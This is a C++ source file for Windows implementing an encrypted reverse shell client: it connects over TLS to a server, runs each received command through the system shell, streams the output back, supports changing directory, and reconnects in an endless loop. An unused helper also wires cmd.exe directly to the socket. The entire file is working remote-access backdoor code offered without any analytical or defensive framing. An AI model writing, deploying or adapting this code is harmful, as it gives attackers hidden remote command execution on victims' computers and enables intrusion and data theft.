#pragma comment(lib, "ws2_32.lib")
#include <iostream>
#include <string>
#include <WS2tcpip.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <mutex>
#include <thread>
#include <io.h>
#include <filesystem>

class Client {
public:
    Client(const std::string& serverIP, int serverPort)
            : serverIP(serverIP), serverPort(serverPort), clientSocket(INVALID_SOCKET), sslContext(nullptr), sslSocket(nullptr) {}



    void ExecuteCommand(SSL* ssl) {
        char Process[] = "cmd.exe";
        STARTUPINFO sinfo;
        PROCESS_INFORMATION pinfo;
        memset(&sinfo, 0, sizeof(sinfo));
        sinfo.cb = sizeof(sinfo);
        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError =  (HANDLE)_get_osfhandle(SSL_get_fd(ssl));
        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
        WaitForSingleObject(pinfo.hProcess, INFINITE);
    }
    void SendMessage(SSL* ssl, const char* buffer) {

        std::string input(buffer);
        const char* data = input.c_str();
        int bytesSent = 0;
        int totalBytes = input.length();
        while (bytesSent < totalBytes) {
            int bytesRemaining = totalBytes - bytesSent;
            int bytesToSend = (bytesRemaining < 4096) ? bytesRemaining : 4096;
            if (SSL_write(ssl, data + bytesSent, bytesToSend) == -1) {
                std::cout << "Failed to send data to server " << std::endl;
                break;
            }
            bytesSent += bytesToSend;
        }
    }

    void ReceiveMessage(SSL* ssl) {
        char buffer[4096];
        std::string cmd;
        int bytesRead;

        while (true) {
            bytesRead = SSL_read(sslSocket, buffer, sizeof(buffer) - 1);
            if (bytesRead <= 0) {
                std::cout << "Failed to receive data from the server." << std::endl;
                break;
            }

            buffer[bytesRead] = '\0';
            std::cout << "Server response: " << buffer << std::endl;
            std::string command(buffer);
            cmd = std::string(buffer, bytesRead);
            namespace fs = std::filesystem;

            if (cmd == "exit") {
                    break;
            }
            else if (cmd.substr(0, 3) == "cd ") {
                // Change directory command
                std::string directory = cmd.substr(3);
                if (fs::exists(directory) && fs::is_directory(directory)) {
                    fs::current_path(directory);
                    SendMessage(sslSocket, "Directory changed");
                }
                else {
                    SendMessage(sslSocket, "Directory Deleted");
                }
            }
            else {
                    FILE *pipe = _popen(cmd.c_str(), "r");
                    if (pipe) {
                        while (!feof(pipe)) {
                            if (fgets(buffer, sizeof(buffer), pipe) != NULL)
                                SendMessage(sslSocket, buffer);
                        }
                        _pclose(pipe);
                    } else {
                        std::cerr << "Failed to execute command" << std::endl;
                        break;
                    }
                }

        }

    }

    bool Connect() {
        WSADATA wsData;
        if (WSAStartup(MAKEWORD(2, 2), &wsData) != 0) {
            std::cout << "Failed to initialize Winsock." << std::endl;
            return false;
        }

        clientSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (clientSocket == INVALID_SOCKET) {
            std::cout << "Failed to create socket." << std::endl;
            WSACleanup();
            return false;
        }

        sockaddr_in serverAddress{};
        serverAddress.sin_family = AF_INET;
        serverAddress.sin_port = htons(serverPort);
        if (inet_pton(AF_INET, serverIP.c_str(), &(serverAddress.sin_addr)) <= 0) {
            std::cout << "Invalid address or address not supported." << std::endl;
            closesocket(clientSocket);
            WSACleanup();
            return false;
        }

        if (connect(clientSocket, (sockaddr*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
            std::cout << "Failed to connect to the server." << std::endl;
            closesocket(clientSocket);
            WSACleanup();
            return false;
        }

        // Initialize OpenSSL
        SSL_library_init();
        SSL_load_error_strings();
        OpenSSL_add_all_algorithms();

        // Create SSL context
        const SSL_METHOD* method = SSLv23_client_method(); // Use SSLv23 method for compatibility
        sslContext = SSL_CTX_new(method);
        if (!sslContext) {
            std::cout << "Failed to create SSL context." << std::endl;
            closesocket(clientSocket);
            WSACleanup();
            return false;
        }

        // Attach SSL socket to the SSL context
        sslSocket = SSL_new(sslContext);
        if (!sslSocket) {
            std::cout << "Failed to create SSL socket." << std::endl;
            SSL_CTX_free(sslContext);
            closesocket(clientSocket);
            WSACleanup();
            return false;
        }
        SSL_set_fd(sslSocket, clientSocket);

        // Perform SSL handshake
        if (SSL_connect(sslSocket) != 1) {
            std::cout << "Failed to perform SSL handshake." << std::endl;
            SSL_free(sslSocket);
            SSL_CTX_free(sslContext);
            closesocket(clientSocket);
            WSACleanup();
            return false;
        }

        return true;
    }

    void Run() {
        ReceiveMessage(sslSocket);

    }

    void Detach() {
        SSL_shutdown(sslSocket);
        SSL_free(sslSocket);
        SSL_CTX_free(sslContext);
        closesocket(clientSocket);
        WSACleanup();
    }

private:
    std::string serverIP;
    int serverPort;
    SOCKET clientSocket;
    SSL_CTX* sslContext;
    SSL* sslSocket;
};

int main() {
    std::string serverIP = "127.0.0.1";
    int serverPort = 5555;
    Client client(serverIP, serverPort);
    while (true) {
        if (client.Connect()) {
            client.Run();
        }
        client.Detach();
    }

    return 0;
}